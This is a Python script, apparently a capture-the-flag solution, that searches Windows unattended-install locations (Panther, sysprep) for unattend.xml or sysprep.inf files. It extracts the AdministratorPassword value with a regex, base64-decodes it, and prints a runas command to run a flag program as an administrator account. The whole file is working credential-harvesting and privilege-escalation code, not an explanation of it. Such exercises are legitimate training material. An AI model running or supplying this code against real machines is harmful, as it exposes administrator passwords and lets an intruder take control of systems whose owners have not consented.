import os
import re
import base64


def solve_task():
    print("[*] Searching for unattended files...")

    locations = [
        r"C:\Windows\Panther",
        r"C:\Windows\System32\sysprep",
        r"C:"
    ]
    files = ["unattend.xml", "autounattend.xml", "sysprep.inf"]

    target_path = ""
    for loc in locations:
        for f in files:
            full_path = os.path.join(loc, f)
            if os.path.exists(full_path):
                target_path = full_path
                break
        if target_path:
            break

    if not target_path:
        print("[-] Target file not found.")
        return

    print(f"[+] Found: {target_path}")

    with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
        data = f.read()

    # Regex Extraction
    pattern = r"<AdministratorPassword>.*?<Value>(.*?)</Value>"
    match = re.search(pattern, data, re.DOTALL)

    if match:
        extracted = match.group(1).strip()
        print(f"[*] Extracted Value: {extracted}")

        # Decoding
        if len(extracted) % 4 != 0:
            extracted += "=" * (4 - len(extracted) % 4)

        password = base64.b64decode(extracted).decode('utf-8')
        print(f"[+] Decoded Password: {password}")

        # Final Instructions
        print("\n" + "="*30)
        print("FINAL STEP: ESTABLISH ADMIN SESSION")
        print("="*30)
        print("Run this command in CMD:")
        cmd = 'runas /user:SuperAdministrator '
        cmd += '"C:\\Users\\SuperAdministrator\\Desktop\\flag.exe"'
        print(cmd)
        print(f"\nPassword to type: {password}")
        print("="*30)
    else:
        print("[-] Password value not found in file.")


if __name__ == "__main__":
    solve_task()
